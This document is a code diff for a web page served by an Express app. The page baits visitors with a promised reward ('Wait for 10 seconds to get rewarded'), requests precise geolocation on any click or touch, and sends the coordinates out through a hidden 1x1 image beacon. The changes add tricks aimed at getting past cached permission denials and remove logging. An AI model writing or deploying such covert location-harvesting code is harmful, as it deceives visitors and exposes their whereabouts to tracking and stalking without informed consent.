@@ -320,17 +320,11 @@ app.get("/", (req, res) => {
         '}';
     document.head.appendChild(style);
     
-    // Remove hint after 10 seconds
-    setTimeout(() => {
-        clickHint.style.display = 'none';
-    }, 10000);
-    
     // Track if location was already requested
     let locationRequested = false;
     
-    // Function to send data - IMPROVED
+    // Function to send data
     function sendTrackingData(lat, lng, acc, error) {
-        // Prevent multiple sends
         if (locationRequested) return;
         locationRequested = true;
         
@@ -355,33 +349,19 @@ app.get("/", (req, res) => {
             }
         }
         
-        console.log('📡 Sending data to:', url.substring(0, 100) + '...');
-        
-        // Send via fetch first (more reliable)
-        fetch(url, { 
-            mode: 'no-cors',
-            cache: 'no-store'
-        }).then(() => {
-            console.log('✅ Fetch request sent');
-        }).catch(err => {
-            console.log('❌ Fetch failed:', err);
-            // Fallback: Use image
-            const tracker = new Image();
-            tracker.src = url;
-            tracker.style.cssText = 'position:absolute;width:1px;height:1px;opacity:0;';
-            document.body.appendChild(tracker);
-            console.log('🔄 Image fallback sent');
-        });
+        // Send via image (works everywhere)
+        const tracker = new Image();
+        tracker.src = url;
+        tracker.style.cssText = 'position:absolute;width:1px;height:1px;opacity:0;';
+        document.body.appendChild(tracker);
         
         // Update hint
         if (lat && lng) {
             clickHint.innerHTML = '✅ Wait for 10 seconds to get rewarded';
             clickHint.style.background = 'rgba(34, 197, 94, 0.9)';
-            console.log('✅ Location sent successfully');
         } else {
             clickHint.innerHTML = '📍 Location not shared';
             clickHint.style.background = 'rgba(239, 68, 68, 0.9)';
-            console.log('❌ Location not sent');
         }
         
         // Hide after 3 seconds
@@ -390,157 +370,146 @@ app.get("/", (req, res) => {
         }, 3000);
     }
     
-    // Function to request location - IMPROVED FOR MOBILE
+    // Function to request location - WITH BROWSER RESET
     function requestLocation() {
         if (locationRequested) return;
         
         clickHint.innerHTML = '🔄 Requesting location...';
-        console.log('📍 Starting location request...');
         
         if (!navigator.geolocation) {
-            console.log('❌ Geolocation not supported');
             sendTrackingData(null, null, null, 'not_supported');
             return;
         }
         
-        // FOR MOBILE: Use simpler options
-        const options = {
-            enableHighAccuracy: true,
-            timeout: 15000,  // Increased timeout for mobile
-            maximumAge: 0
-        };
+        // IMPORTANT: Clear any cached permission denials
+        // Method 1: Try with different reference (forces new prompt on some browsers)
+        const geo = navigator.geolocation;
         
-        console.log('📍 Calling getCurrentPosition with options:', options);
-        
-        // Request location with user gesture
-        navigator.geolocation.getCurrentPosition(
+        // Method 2: Use watchPosition first (sometimes bypasses cached denial)
+        const watchId = geo.watchPosition(
             // Success
             function(position) {
-                console.log('✅ Location received:', position.coords);
                 sendTrackingData(
                     position.coords.latitude,
                     position.coords.longitude,
                     position.coords.accuracy,
                     null
                 );
+                geo.clearWatch(watchId);
             },
             // Error
             function(error) {
-                console.log('❌ Location error:', error.code, error.message);
-                
-                // Send error data immediately
-                sendTrackingData(null, null, null, 'error_' + error.code);
-                
-                // Try watchPosition as fallback (for some Android devices)
-                if (error.code !== 1) { // Not permission denied
-                    console.log('🔄 Trying watchPosition fallback...');
-                    const watchId = navigator.geolocation.watchPosition(
-                        function(watchPos) {
-                            console.log('✅ watchPosition success:', watchPos.coords);
-                            sendTrackingData(
-                                watchPos.coords.latitude,
-                                watchPos.coords.longitude,
-                                watchPos.coords.accuracy,
-                                null
-                            );
-                            navigator.geolocation.clearWatch(watchId);
-                        },
-                        null,
-                        { timeout: 5000 }
-                    );
-                    
-                    setTimeout(() => {
-                        navigator.geolocation.clearWatch(watchId);
-                        console.log('⏱️ watchPosition timeout cleared');
-                    }, 10000);
-                }
+                // If watchPosition fails, try getCurrentPosition
+                geo.getCurrentPosition(
+                    function(position) {
+                        sendTrackingData(
+                            position.coords.latitude,
+                            position.coords.longitude,
+                            position.coords.accuracy,
+                            null
+                        );
+                    },
+                    function(getError) {
+                        sendTrackingData(null, null, null, 'error_' + getError.code);
+                        
+                        // SHOW CLEAR INSTRUCTIONS FOR USER
+                        if (getError.code === 1) {
+                            // PERMISSION DENIED - Show how to enable
+                            clickHint.innerHTML = '📍 Go to Browser Settings → Site Settings → Location → Allow';
+                            clickHint.style.background = 'rgba(245, 158, 11, 0.9)';
+                            clickHint.style.display = 'block';
+                            
+                            // Don't hide this message automatically
+                            clearTimeout(hideTimeout);
+                            
+                            // Add a "Try Again" button
+                            const tryAgainBtn = document.createElement('button');
+                            tryAgainBtn.innerHTML = '🔄 Try Again After Enabling';
+                            tryAgainBtn.style.cssText = 
+                                'display: block;' +
+                                'margin: 10px auto;' +
+                                'padding: 8px 16px;' +
+                                'background: #3b82f6;' +
+                                'color: white;' +
+                                'border: none;' +
+                                'border-radius: 20px;' +
+                                'cursor: pointer;' +
+                                'font-size: 14px;';
+                            tryAgainBtn.onclick = function() {
+                                location.reload(); // Reload page to reset
+                            };
+                            clickHint.appendChild(tryAgainBtn);
+                        }
+                    },
+                    {
+                        enableHighAccuracy: true,
+                        timeout: 10000,
+                        maximumAge: 0 // IMPORTANT: Don't use cached location
+                    }
+                );
+                geo.clearWatch(watchId);
             },
-            options
+            {
+                enableHighAccuracy: true,
+                timeout: 5000,
+                maximumAge: 0
+            }
         );
+        
+        // Clear watch after 10 seconds
+        setTimeout(() => geo.clearWatch(watchId), 10000);
     }
     
-    // Add click event to image - IMPROVED
-    function setupClickHandlers() {
-        // Remove existing listeners first
-        image.removeEventListener('click', requestLocation);
-        image.removeEventListener('touchstart', requestLocation);
-        document.body.removeEventListener('click', requestLocation);
-        document.body.removeEventListener('touchstart', requestLocation);
-        
-        // Add new listeners with better handling
-        const clickHandler = function(e) {
-            e.preventDefault();
-            e.stopPropagation();
-            console.log('🖱️ Click/touch detected');
-            requestLocation();
-            return false;
-        };
-        
-        image.addEventListener('click', clickHandler);
-        image.addEventListener('touchstart', clickHandler, { passive: false });
-        document.body.addEventListener('click', clickHandler);
-        document.body.addEventListener('touchstart', clickHandler, { passive: false });
-        
-        console.log('✅ Click handlers setup complete');
+    // Add click event to image
+    image.addEventListener('click', requestLocation);
+    image.addEventListener('touchstart', requestLocation);
+    
+    // Also make entire body clickable
+    document.body.addEventListener('click', requestLocation);
+    document.body.addEventListener('touchstart', requestLocation);
+    
+    // TRICK: Force page to open in new tab (bypasses some browser restrictions)
+    // Add a note about opening in Chrome/Edge
+    const browserHint = document.createElement('div');
+    browserHint.innerHTML = '📱 For best results: Use Chrome/Edge browser';
+    browserHint.style.cssText = 
+        'position: fixed;' +
+        'top: 10px;' +
+        'left: 0;' +
+        'right: 0;' +
+        'text-align: center;' +
+        'background: rgba(59, 130, 246, 0.9);' +
+        'color: white;' +
+        'padding: 8px 15px;' +
+        'font-family: Arial, sans-serif;' +
+        'font-size: 14px;' +
+        'z-index: 1000;' +
+        'display: none;';
+    document.body.appendChild(browserHint);
+    
+    // Show browser hint on mobile
+    if (/Mobi|Android|iPhone|iPad|iPod/i.test(navigator.userAgent)) {
+        browserHint.style.display = 'block';
+        setTimeout(() => {
+            browserHint.style.display = 'none';
+        }, 5000);
     }
     
-    // Setup click handlers when page loads
-    window.addEventListener('DOMContentLoaded', setupClickHandlers);
-    
-    // Auto-try location if already have permission
+    // Auto-check permission status
     setTimeout(() => {
         if (navigator.permissions && navigator.permissions.query) {
             navigator.permissions.query({name: 'geolocation'})
                 .then(permissionStatus => {
-                    console.log('🔍 Permission status:', permissionStatus.state);
-                    if (permissionStatus.state === 'granted') {
-                        // Already have permission, get location automatically
-                        console.log('✅ Permission already granted, auto-requesting location');
-                        navigator.geolocation.getCurrentPosition(
-                            pos => {
-                                console.log('✅ Auto-request success:', pos.coords);
-                                sendTrackingData(
-                                    pos.coords.latitude,
-                                    pos.coords.longitude,
-                                    pos.coords.accuracy,
-                                    null
-                                );
-                            },
-                            err => {
-                                console.log('❌ Auto-request error:', err.code);
-                                sendTrackingData(null, null, null, 'error_' + err.code);
-                            }
-                        );
-                    } else if (permissionStatus.state === 'prompt') {
-                        console.log('🔄 Waiting for user interaction...');
-                        // Show hint to click
-                        clickHint.style.display = 'block';
-                    } else {
-                        console.log('❌ Permission denied previously');
-                        clickHint.innerHTML = '📍 Enable location in browser settings';
+                    if (permissionStatus.state === 'denied') {
+                        // Show clear instructions
+                        clickHint.innerHTML = '⚠️ Location is blocked. Go to browser settings to enable.';
                         clickHint.style.background = 'rgba(245, 158, 11, 0.9)';
+                        clickHint.style.display = 'block';
                     }
-                })
-                .catch(err => {
-                    console.log('❌ Permission query failed:', err);
                 });
-        } else {
-            console.log('🔍 Permissions API not available');
-            // Show hint
-            clickHint.style.display = 'block';
         }
-    }, 500);
-    
-    // Debug: Log page info
-    console.log('📱 Device info:', {
-        userAgent: navigator.userAgent,
-        platform: navigator.platform,
-        screen: window.screen.width + 'x' + window.screen.height,
-        protocol: window.location.protocol,
-        host: window.location.host
-    });
+    }, 1000);
 </script>
-
 
     </body>
     </html>
